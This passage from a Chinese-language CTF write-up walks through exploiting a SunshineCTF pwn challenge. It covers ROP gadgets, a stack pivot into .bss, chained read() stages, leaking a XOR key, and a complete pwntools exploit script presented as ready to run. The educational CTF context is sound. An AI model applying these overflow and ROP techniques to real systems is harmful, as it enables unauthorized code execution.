\texttt{0x401c32} & \texttt{mov\ \allowbreak{}rdx,\allowbreak{}rax;\ \allowbreak{}jmp\ \allowbreak{}write@plt} &
\texttt{write(rdi,\allowbreak{}\ \allowbreak{}rsi,\allowbreak{}\ \allowbreak{}rax)} \\
\end{longtable}
}

\texttt{0x401c32} 特別妙：它在 \texttt{0x401c20}（一個
\texttt{write\_\allowbreak{}string} 函式）裡面， 前面剛好是 \texttt{pop\ \allowbreak{}rbx}、後面是
\texttt{mov\ \allowbreak{}rdx,\allowbreak{}rax;\ \allowbreak{}jmp\ \allowbreak{}write@plt}。 因為 \texttt{jmp}（不是
\texttt{call}）跳到 \texttt{write@plt}， 所以 \texttt{write} 返回時會
\texttt{ret} 到\textbf{我們堆疊上的下一個 qword} ------ 完美的 gadget。✓

\begin{quote}
※注意 \textbf{「跳進函式中段」是什麼意思？} 看 \texttt{0x401c20}
的完整長相：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401c20:  }\BuiltInTok{push} \KeywordTok{rbx}
\NormalTok{401c21:  }\BuiltInTok{mov}  \KeywordTok{rbx}\OperatorTok{,}\KeywordTok{rdi}
\NormalTok{401c24:  }\ControlFlowTok{call}\NormalTok{ strlen}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}
\NormalTok{401c29:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbx}
\NormalTok{401c2c:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\DecValTok{1}
\NormalTok{401c31:  }\BuiltInTok{pop}  \KeywordTok{rbx}          \CommentTok{; ← pop rbx 在 0x401c31}
\NormalTok{401c32:  }\BuiltInTok{mov}  \KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rax}      \CommentTok{; ← 我們跳進來的位置就在下一行}
\NormalTok{401c35:  }\ControlFlowTok{jmp}\NormalTok{  write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}
\end{Highlighting}
\end{Shaded}

我們從 \texttt{0x401c32} 跳進去，所以
\texttt{push\ \allowbreak{}rbx}、\texttt{call\ \allowbreak{}strlen} 通通被跳過， 而
\texttt{0x401c31} 的 \texttt{pop\ \allowbreak{}rbx} \textbf{也不會執行} →
\texttt{rbx} 不會被覆蓋。 代價是 \texttt{rax} 是「上一個 gadget
留下的值」，不是 \texttt{strlen} 的回傳值 ------
這正是我們要的（\texttt{rdx\ \allowbreak{}=\ \allowbreak{}rax}）。這就是「跳進函式中段」的典型用法。
\end{quote}

\paragraph{\texorpdfstring{6.1 用 \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)}
當「續接器」}{6.1 用 read(0, rsp, bl) 當「續接器」}}\label{ux7528-read0-rsp-bl-ux7576ux7e8cux63a5ux5668}

\texttt{0x401f07} 這個片段的 \texttt{rsi\ \allowbreak{}=\ \allowbreak{}rsp}，所以我們只要控制
\texttt{rsp}， 之後每一段 ROP 鏈就能用 \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}0xff)}
一段一段接下去， 而且\textbf{每次都能重新讀 255 bytes}。

\paragraph{\texorpdfstring{6.2 但 \texttt{rsp} 在哪？→ Stack
pivot}{6.2 但 rsp 在哪？→ Stack pivot}}\label{ux4f46-rsp-ux5728ux54ea-stack-pivot}

我們不知道堆疊位址（沒有洩漏），所以要把 \texttt{rsp}
搬到\textbf{已知位址}。 唯一已知的可寫區就是 \texttt{NOTE} 的筆記區
\texttt{0x40a180}。

用 \texttt{pop\ \allowbreak{}rsp} gadget：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401523:  }\BuiltInTok{pop} \KeywordTok{rsp} \CommentTok{; pop r13 ; pop r14 ; pop r15 ; ret}
\end{Highlighting}
\end{Shaded}

流程：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
SUBMIT 的 ret  →  0x401523
   pop rsp  ← 從 overflow payload 讀到 0x40a168 (= NOTES-0x18)
               → rsp = 0x40a168
   pop r13 / pop r14 / pop r15  → rsp 前進 0x18 → 0x40a180
   ret      ← 讀 [0x40a180] = 0x401f07  ← 這正是我們用 NOTE 寫進去的值！
               → rsp = 0x40a188
執行 0x401f07: read(0, 0x40a188, 0xff)
\end{Verbatim}

\textbf{這就是為什麼要先
\texttt{NOTE\ \allowbreak{}0\ \allowbreak{}\textbackslash{}\allowbreak{}x07\textbackslash{}\allowbreak{}x1f\textbackslash{}\allowbreak{}x40}。}
\texttt{strncpy} 會把剩下的 byte 補 0，所以 3 個 byte 就等於
\texttt{0x0000000000401f07}。

\texttt{.\allowbreak{}bss} 的實際長相（全部都是固定的已知位址，這張圖建議配合 gdb
看）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x405060  key（4 bytes，XOR 加解密用）
0x405064  槽計數器（4 bytes）
0x405080  fd 槽 #0 {state=2, fd=flag.txt}     ← index=-4 打到的目標（唯一有 flag fd 的槽）
0x40548c  fd 槽 #1 {state=2, fd=/dev/null}
0x405898  fd 槽 #2 {state=2, fd=/dev/null}
0x405ca4  fd 槽 #3 {state=2, fd=/dev/null}    ← 迴圈「先寫後比」多寫的那一格（見 §4.1）
0x4060b0  儲存槽表（16 槽 × 0x40c）
              ^
              └── 0x4060b0 + (-4)*0x40c = 0x405080

0x40a168  ← pop rsp 的落點（PIVOT_TOP）；這裡是 .bss 的 0，所以 pop r13/r14/r15 讀到 0
0x40a180  ← NOTE 0 寫進去的 8 bytes（= 0x401f07）；ret 從這裡取值
0x40a188  ← 第一次 read(0, rsp, 0xff) 的目標 = A1
\end{Verbatim}

\texttt{SUBMIT} 溢位後的搬移過程（每一步的 \texttt{rsp}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
  SUBMIT 的 ret  → 0x401523 (pop rsp; pop r13; pop r14; pop r15; ret)
     pop rsp     讀 [S+0x50]  = 0x40a168     → rsp = 0x40a168
     pop r13     讀 [0x40a168] = 0           → rsp = 0x40a170
     pop r14     讀 [0x40a170] = 0           → rsp = 0x40a178
     pop r15     讀 [0x40a178] = 0           → rsp = 0x40a180
     ret         讀 [0x40a180] = 0x401f07    → rsp = 0x40a188
  0x401f07: read(0, 0x40a188, bl)             ← 之後的鏈都在這裡接
\end{Verbatim}

\paragraph{\texorpdfstring{6.3 每次 read 回來之後的 \texttt{rsp}
補償}{6.3 每次 read 回來之後的 rsp 補償}}\label{ux6bcfux6b21-read-ux56deux4f86ux4e4bux5f8cux7684-rsp-ux88dcux511f}

\texttt{0x401f07} 是 \texttt{SUBMIT} 函式的\textbf{中間}，所以
\texttt{read} 回來之後 會繼續跑 \texttt{SUBMIT} 剩下的：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
401f14:  test rax,rax
401f17:  jle  401f2f
401f19..401f2a: write(1, "OK\n", 3)
401f2f:  add  rsp,0x40        ; ← rsp += 0x40
401f33:  pop  rbx             ; ← rbx = [rsp]  ; rsp += 8
401f34:  ret                  ; ← rip = [rsp]
\end{Verbatim}

所以每一段鏈的佈局固定是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
read 目標 + 0x00 ~ 0x3f : 隨便 (0x40 bytes)
read 目標 + 0x40        : rbx（我們通常放 0xff，讓下一次 read 讀 255 bytes）
read 目標 + 0x48        : 鏈的第 0 個 qword（ret 目標）
\end{Verbatim}

這也解釋了 \texttt{A2\ \allowbreak{}=\ \allowbreak{}A1\ \allowbreak{}+\ \allowbreak{}0x48\ \allowbreak{}+\ \allowbreak{}8*len(chain)} 這個公式。

每一段鏈（d1 / d2 / d3）的佈局都一樣，只是位址不同：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
誰讀它
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{A\ \allowbreak{}+\ \allowbreak{}0x00} \textasciitilde{} \texttt{A\ \allowbreak{}+\ \allowbreak{}0x3f} & 隨便（0x40
bytes 緩衝區） & \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}0xff)} 寫進來 \\
\texttt{A\ \allowbreak{}+\ \allowbreak{}0x40} & \texttt{rbx}（下一段的讀取長度，通常 0xff） &
\texttt{add\ \allowbreak{}rsp,\allowbreak{}0x40} 之後的 \texttt{pop\ \allowbreak{}rbx} \\
\texttt{A\ \allowbreak{}+\ \allowbreak{}0x48} & 鏈的第 0 個 qword（\texttt{ret} 的目標） &
\texttt{pop\ \allowbreak{}rbx} 之後的 \texttt{ret} \\
\texttt{A\ \allowbreak{}+\ \allowbreak{}0x48\ \allowbreak{}+\ \allowbreak{}8n} & 鏈的其他 qword & 每個 gadget 的
\texttt{ret} \\
\end{longtable}
}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}llll@{}}
\toprule\noalign{}
段落 & A（= \texttt{read} 目標） & 實際數值 & 備註 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
d1 & \texttt{A1\ \allowbreak{}=\ \allowbreak{}NOTES+8} & \texttt{0x40a188} & 洩漏 XOR key \\
d2 & \texttt{A2\ \allowbreak{}=\ \allowbreak{}A1+0x48+8*11} & \texttt{0x40a228} & 寫偽造封包進 fd
3 \\
d3 & \texttt{A3\ \allowbreak{}=\ \allowbreak{}A2+0x48+8*14} & \texttt{0x40a2e0} & 接
\texttt{RELAY\_\allowbreak{}RX} 收 flag \\
\end{longtable}
}

\begin{quote}
※提示 \textbf{為什麼「鏈的起點」等於「\texttt{read} 的目標」？} 因為
\texttt{0x401f07} 是用 \texttt{ret} 跳進去的：那一刻 \texttt{rsp}
剛好指向「前一段鏈結束的下一個 qword」， 而 \texttt{0x401f07} 的
\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)} 就是從 \texttt{rsp} 開始寫。 所以
\textbf{\texttt{read} 的寫入起點 = 下一段鏈的起點}， 這就是
\texttt{A2\ \allowbreak{}=\ \allowbreak{}A1\ \allowbreak{}+\ \allowbreak{}0x48\ \allowbreak{}+\ \allowbreak{}8*len(chain)} 的由來 （\texttt{0x48}
是鏈相對於 \texttt{A1} 的起點，\texttt{8*len(chain)}
是上一段鏈佔用的長度）。 千萬不要誤會成「鏈要放在 read 目標 +
0x48」------那是同一段鏈\textbf{內部}的偏移。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7. Exploit
流程（三階段）}\label{exploit-ux6d41ux7a0bux4e09ux968eux6bb5}

\begin{quote}
完整、可直接執行的程式在
\texttt{pwn7/\allowbreak{}exploit.\allowbreak{}py}（本文只拆解關鍵段落；卡住時直接看那份）。

※注意 \textbf{下面這段是「照抄就能跑」的完整版，千萬不要漏掉「等提示字元
/ 等 \texttt{OK\textbackslash{}\allowbreak{}n}」的那幾行。}
\texttt{SUBMIT}、以及每一次 \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)}
讀完之後，程式都會印 \texttt{OK\textbackslash{}\allowbreak{}n}；
如果沒把它收乾淨，它就會被當成「key 的前 4
bytes」，整條鏈會用\textbf{錯的 key} 加密而失敗
（症狀是「什麼都沒印」或「莫名斷線」，非常難查）。 實測：只漏掉下面第 ③
個
\texttt{recvuntil(b\textquotesingle{}\allowbreak{}OK\textbackslash{}\allowbreak{}n\textquotesingle{}\allowbreak{})}，\texttt{recvn(6)}
收到的就是
\texttt{b\textquotesingle{}\allowbreak{}OK\textbackslash{}\allowbreak{}n\textquotesingle{}\allowbreak{}\ \allowbreak{}+\ \allowbreak{}key{[}0{]}}（例如
\texttt{b\textquotesingle{}\allowbreak{}OK\textbackslash{}\allowbreak{}n\textbackslash{}\allowbreak{}x1c\textbackslash{}\allowbreak{}xcc\textbackslash{}\allowbreak{}xdb\textquotesingle{}\allowbreak{}}）而不是「4
bytes key + 2 bytes 雜訊」。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\NormalTok{context.arch      }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{\textquotesingle{}info\textquotesingle{}}

\NormalTok{POP\_RSP       }\OperatorTok{=} \BaseNTok{0x401523}   \CommentTok{\# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret}
\NormalTok{POP\_RDI       }\OperatorTok{=} \BaseNTok{0x401529}   \CommentTok{\# pop rdi ; ret}
\NormalTok{POP\_RSI       }\OperatorTok{=} \BaseNTok{0x401dd5}   \CommentTok{\# pop rsi ; ret}
\NormalTok{POP\_RBX       }\OperatorTok{=} \BaseNTok{0x401f33}   \CommentTok{\# pop rbx ; ret}
\NormalTok{WRITE\_RDX\_RAX }\OperatorTok{=} \BaseNTok{0x401c32}   \CommentTok{\# mov rdx,rax ; jmp write@plt  {-}\textgreater{} write(rdi, rsi, rax)}
\NormalTok{SUBMIT\_READ   }\OperatorTok{=} \BaseNTok{0x401f07}   \CommentTok{\# xor edi,edi ; movzx edx,bl ; mov rsi,rsp ; call read}
\NormalTok{RELAY\_RX      }\OperatorTok{=} \BaseNTok{0x401fda}   \CommentTok{\# mov edx,0x100 ; mov rsi,rbx ; mov edi,3 ; call read}
\NormalTok{KEY           }\OperatorTok{=} \BaseNTok{0x405060}   \CommentTok{\# XOR key（4 bytes）}
\NormalTok{NOTES         }\OperatorTok{=} \BaseNTok{0x40a180}   \CommentTok{\# }\AlertTok{NOTE}\CommentTok{ 筆記區（已知位址的可寫區）}
\NormalTok{PIVOT\_TOP     }\OperatorTok{=}\NormalTok{ NOTES }\OperatorTok{{-}} \BaseNTok{0x18}   \CommentTok{\# pop rsp 的落點}
\NormalTok{A1            }\OperatorTok{=}\NormalTok{ NOTES }\OperatorTok{+} \DecValTok{8}      \CommentTok{\# 第一次 pivot read 的目標 = 0x40a188}


\KeywordTok{def}\NormalTok{ xor\_key(data, key):}
\NormalTok{    ks }\OperatorTok{=}\NormalTok{ key[::}\OperatorTok{{-}}\DecValTok{1}\NormalTok{]}
    \ControlFlowTok{return} \BuiltInTok{bytes}\NormalTok{(c }\OperatorTok{\^{}}\NormalTok{ ks[i }\OperatorTok{\%} \DecValTok{4}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ i, c }\KeywordTok{in} \BuiltInTok{enumerate}\NormalTok{(data))}


\NormalTok{io }\OperatorTok{=}\NormalTok{ process(}\StringTok{\textquotesingle{}./service\textquotesingle{}}\NormalTok{)          }\CommentTok{\# 遠端就改成 remote(\textquotesingle{}chal.sunshinectf.games\textquotesingle{}, 26007)}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}sh\textgreater{} \textquotesingle{}}\NormalTok{)                                   }\CommentTok{\# (1) 等第一個提示字元}

\NormalTok{io.send(}\StringTok{b\textquotesingle{}NOTE 0 \textquotesingle{}} \OperatorTok{+}\NormalTok{ p64(SUBMIT\_READ)[:}\DecValTok{3}\NormalTok{] }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)      }\CommentTok{\# 階段 0}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}sh\textgreater{} \textquotesingle{}}\NormalTok{)                                   }\CommentTok{\# (2) 等 }\AlertTok{NOTE}\CommentTok{ 完成}

\NormalTok{stage  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*} \DecValTok{64} \OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0xff}\NormalTok{) }\OperatorTok{+}\NormalTok{ p64(POP\_RSP) }\OperatorTok{+}\NormalTok{ p64(PIVOT\_TOP) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{) }\OperatorTok{*} \DecValTok{3}
\ControlFlowTok{assert} \BuiltInTok{len}\NormalTok{(stage) }\OperatorTok{==} \DecValTok{112}
\NormalTok{io.send(}\StringTok{b\textquotesingle{}SUBMIT \%d}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}} \OperatorTok{\%} \BuiltInTok{len}\NormalTok{(stage) }\OperatorTok{+}\NormalTok{ stage)            }\CommentTok{\# 階段 1}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}OK}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)                                   }\CommentTok{\# (3) SUBMIT 自己的 OK\textbackslash{}n}

\CommentTok{\# {-}{-}{-}{-} 階段 2：把鏈放進 255 bytes 的緩衝區 {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\NormalTok{d1 }\OperatorTok{=} \BuiltInTok{bytearray}\NormalTok{(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}0}\StringTok{\textquotesingle{}} \OperatorTok{*} \DecValTok{255}\NormalTok{)        }\CommentTok{\# 長度 = 0x401f07 的 bl（由 stage 的 p64(0xff) 決定）}
\NormalTok{d1[}\BaseNTok{0x40}\NormalTok{] }\OperatorTok{=} \BaseNTok{0xff}                    \CommentTok{\# → 下一次 read 的長度}
\NormalTok{chain  }\OperatorTok{=}\NormalTok{ [POP\_RDI, }\DecValTok{1}\NormalTok{, POP\_RSI, KEY, WRITE\_RDX\_RAX,}
\NormalTok{          POP\_RSI, KEY }\OperatorTok{+} \DecValTok{3}\NormalTok{, WRITE\_RDX\_RAX,}
\NormalTok{          POP\_RBX, }\BaseNTok{0xff}\NormalTok{, SUBMIT\_READ]}
\NormalTok{A2 }\OperatorTok{=}\NormalTok{ A1 }\OperatorTok{+} \BaseNTok{0x48} \OperatorTok{+} \DecValTok{8} \OperatorTok{*} \BuiltInTok{len}\NormalTok{(chain)    }\CommentTok{\# 下一段的 read 位址}
\NormalTok{d1[}\BaseNTok{0x48}\NormalTok{:}\BaseNTok{0x48} \OperatorTok{+} \DecValTok{8} \OperatorTok{*} \BuiltInTok{len}\NormalTok{(chain)] }\OperatorTok{=} \StringTok{b\textquotesingle{}\textquotesingle{}}\NormalTok{.join(p64(x) }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in}\NormalTok{ chain)   }\CommentTok{\# 鏈從 A1+0x48 開始}
\NormalTok{io.send(}\BuiltInTok{bytes}\NormalTok{(d1))}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}OK}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{3}\NormalTok{)   }\CommentTok{\# (4) 這次 read 印的 OK\textbackslash{}n}
\NormalTok{leak }\OperatorTok{=}\NormalTok{ io.recvn(}\DecValTok{6}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{3}\NormalTok{)      }\CommentTok{\# (5) 6 bytes 才是 key（前 4 bytes）}
\NormalTok{key }\OperatorTok{=}\NormalTok{ leak[:}\DecValTok{4}\NormalTok{]}

\CommentTok{\# {-}{-}{-}{-} 階段 3：同一個模式，只是把 write 的 fd 改成 3 {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\NormalTok{d2 }\OperatorTok{=} \BuiltInTok{bytearray}\NormalTok{(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}0}\StringTok{\textquotesingle{}} \OperatorTok{*} \DecValTok{255}\NormalTok{)}
\NormalTok{d2[}\DecValTok{0}\NormalTok{:}\DecValTok{8}\NormalTok{] }\OperatorTok{=}\NormalTok{ xor\_key(p8(}\DecValTok{3}\NormalTok{) }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00\textbackslash{}x04}\StringTok{\textquotesingle{}} \OperatorTok{+}\NormalTok{ p8(}\DecValTok{0}\NormalTok{) }\OperatorTok{+}\NormalTok{ p32(}\BaseNTok{0xfffffffc}\NormalTok{), key)}
\NormalTok{chain  }\OperatorTok{=}\NormalTok{ [POP\_RDI, }\DecValTok{3}\NormalTok{, POP\_RSI, A2, WRITE\_RDX\_RAX,}
\NormalTok{          POP\_RSI, A2 }\OperatorTok{+} \DecValTok{3}\NormalTok{, WRITE\_RDX\_RAX,}
\NormalTok{          POP\_RSI, A2 }\OperatorTok{+} \DecValTok{6}\NormalTok{, WRITE\_RDX\_RAX,}
\NormalTok{          POP\_RBX, }\BaseNTok{0xff}\NormalTok{, SUBMIT\_READ]}
\NormalTok{A3 }\OperatorTok{=}\NormalTok{ A2 }\OperatorTok{+} \BaseNTok{0x48} \OperatorTok{+} \DecValTok{8} \OperatorTok{*} \BuiltInTok{len}\NormalTok{(chain)}
\NormalTok{RESP }\OperatorTok{=}\NormalTok{ A3 }\OperatorTok{+} \BaseNTok{0x60}
\NormalTok{d2[}\BaseNTok{0x48}\NormalTok{:}\BaseNTok{0x48} \OperatorTok{+} \DecValTok{8} \OperatorTok{*} \BuiltInTok{len}\NormalTok{(chain)] }\OperatorTok{=} \StringTok{b\textquotesingle{}\textquotesingle{}}\NormalTok{.join(p64(x) }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in}\NormalTok{ chain)}
\NormalTok{io.send(}\BuiltInTok{bytes}\NormalTok{(d2))}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}OK}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{3}\NormalTok{)   }\CommentTok{\# (6) 這次 read 印的 OK\textbackslash{}n}

\CommentTok{\# {-}{-}{-}{-} 階段 4 {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\NormalTok{time.sleep(}\FloatTok{0.7}\NormalTok{)                    }\CommentTok{\# 等保險箱的回覆到齊}
\NormalTok{d3 }\OperatorTok{=} \BuiltInTok{bytearray}\NormalTok{(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}0}\StringTok{\textquotesingle{}} \OperatorTok{*} \DecValTok{120}\NormalTok{)}
\NormalTok{d3[}\BaseNTok{0x40}\NormalTok{:}\BaseNTok{0x48}\NormalTok{] }\OperatorTok{=}\NormalTok{ p64(RESP)          }\CommentTok{\# rbx = RELAY\_RX 的緩衝區}
\NormalTok{d3[}\BaseNTok{0x48}\NormalTok{:}\BaseNTok{0x50}\NormalTok{] }\OperatorTok{=}\NormalTok{ p64(RELAY\_RX)      }\CommentTok{\# ret → read(3, RESP, 0x100) + 解密 + 印出}
\NormalTok{io.send(}\BuiltInTok{bytes}\NormalTok{(d3))}
\BuiltInTok{print}\NormalTok{(io.recvall(timeout}\OperatorTok{=}\DecValTok{3}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※閱讀 \textbf{先定義 \texttt{d1} / \texttt{d2} / \texttt{d3}
是什麼}（原本的 §7 只出現 \texttt{d2{[}8{]}}，卻從沒定義 \texttt{d2}）：
\texttt{d1} / \texttt{d2} 是「一段鏈的完整輸入」＝
\texttt{bytearray(b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}0\textquotesingle{}\allowbreak{}\ \allowbreak{}*\ \allowbreak{}255)}（255
= 那次 \texttt{read} 的 \texttt{bl}）， 其中 \texttt{{[}0x40{]}} 放
\texttt{rbx}（下一段的長度）、\texttt{{[}0x48{]}} 開始放鏈。 \texttt{d3}
只用到前 \texttt{0x50} bytes，所以給 120 bytes 也夠。
\end{quote}

\begin{quote}
※提示 \textbf{\texttt{read()} 的長度與「實際交付幾個 byte」是兩件事}：
\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)} 的 \texttt{bl} 由鏈上的 \texttt{POP\_\allowbreak{}RBX}
決定（我們放 \texttt{0xff} = 255）， 但 \texttt{read}
\textbf{回傳的是「這次實際收到幾個 byte」}，不是 255。所以： *
我們用\textbf{一次} \texttt{io.\allowbreak{}send()} 把整段 \texttt{d1}（255
bytes）送出去 → 核心一次交付，鏈完整。 * \texttt{d3} 只需要覆蓋到
\texttt{+0x50}（\texttt{rbx} 與 \texttt{ret} 目標），所以 120 bytes
就夠。 * 反過來說，\textbf{不能}把 \texttt{d1} 切成好幾次小
\texttt{send()}：\texttt{read} 可能只收到前半段， 鏈就會用半截資料執行而
crash。
\end{quote}

\paragraph{階段 0：種下 pivot
目標}\label{ux968eux6bb5-0ux7a2eux4e0b-pivot-ux76eeux6a19}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{io.send(}\StringTok{b\textquotesingle{}NOTE 0 \textquotesingle{}} \OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0x401f07}\NormalTok{)[:}\DecValTok{3}\NormalTok{] }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)   }\CommentTok{\# .bss[0x40a180] = 0x401f07}
\end{Highlighting}
\end{Shaded}

\paragraph{階段 1：SUBMIT 溢位 +
pivot}\label{ux968eux6bb5-1submit-ux6ea2ux4f4d-pivot}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stage  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*} \DecValTok{64} \OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0xff}\NormalTok{)                        }\CommentTok{\# 塞滿 0x40 buffer + saved rbx=0xff}
\NormalTok{stage }\OperatorTok{+=}\NormalTok{ p64(POP\_RSP) }\OperatorTok{+}\NormalTok{ p64(PIVOT\_TOP) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{) }\OperatorTok{*} \DecValTok{3}   \CommentTok{\# pop rsp; ...; ret}
\CommentTok{\# 注意：上面那 3 個 p64(0) 其實**不會被讀到**！pop rsp 一執行完 rsp 就變成 PIVOT\_TOP，}
\CommentTok{\# 後面 pop r13/r14/r15 讀的是 .bss 裡 [0x40a168]\textasciitilde{}[0x40a178] 的值（那裡本來就是 0）。}
\CommentTok{\# 留著只是為了讓 stage 長度剛好 112（= 0x40 + 8 + 8 + 8*3 + 8），對齊好看。}
\NormalTok{io.send(}\StringTok{b\textquotesingle{}SUBMIT \%d}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}} \OperatorTok{\%} \BuiltInTok{len}\NormalTok{(stage) }\OperatorTok{+}\NormalTok{ stage)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 溢位 payload 的 offset 對照：\texttt{0x40}
是緩衝區大小、\texttt{0x40} 的位置是 \texttt{saved\ \allowbreak{}rbx}（= 0xff）、
\texttt{0x48} 的位置才是\textbf{被覆蓋的返回位址}（= \texttt{POP\_\allowbreak{}RSP}
的位址）。 \texttt{pop\ \allowbreak{}rsp} 再從 \texttt{{[}S+0x50{]}} 讀出
\texttt{PIVOT\_\allowbreak{}TOP}（\texttt{S} = SUBMIT 當時的 \texttt{rsp}）。
\end{quote}

\paragraph{階段 2：第一次 pivot read（洩漏 XOR
key）}\label{ux968eux6bb5-2ux7b2cux4e00ux6b21-pivot-readux6d29ux6f0f-xor-key}

送到 \texttt{0x40a188}，長度 \texttt{0xff}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
chain = [ POP_RDI, 1, POP_RSI, KEY, WRITE_RDX_RAX ]   # write(1, 0x405060, rax)
chain += [ POP_RSI, KEY+3, WRITE_RDX_RAX ]            # write(1, 0x405063, 3)
chain += [ POP_RBX, 0xff, SUBMIT_READ ]               # 續接下一段
\end{Verbatim}

\begin{itemize}
\item
  ※注意 \textbf{\texttt{rax} 到底是多少？這裡很反直覺。}
  你可能會想：「\texttt{read} 讀了 0xff bytes，所以
  \texttt{rax\ \allowbreak{}=\ \allowbreak{}0xff}， 那 \texttt{write(1,\allowbreak{}\ \allowbreak{}KEY,\allowbreak{}\ \allowbreak{}0xff)} 就會一次洩漏
  255 bytes」。\textbf{錯。} \texttt{0x401f07} 是 \texttt{SUBMIT}
  函式的\textbf{中段}，\texttt{read} 回來之後程式會繼續往下跑：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401f14:  }\BuiltInTok{test} \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401f17:  }\ControlFlowTok{jle}  \DecValTok{401}\ErrorTok{f2f}
\NormalTok{401f19:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\DecValTok{3}
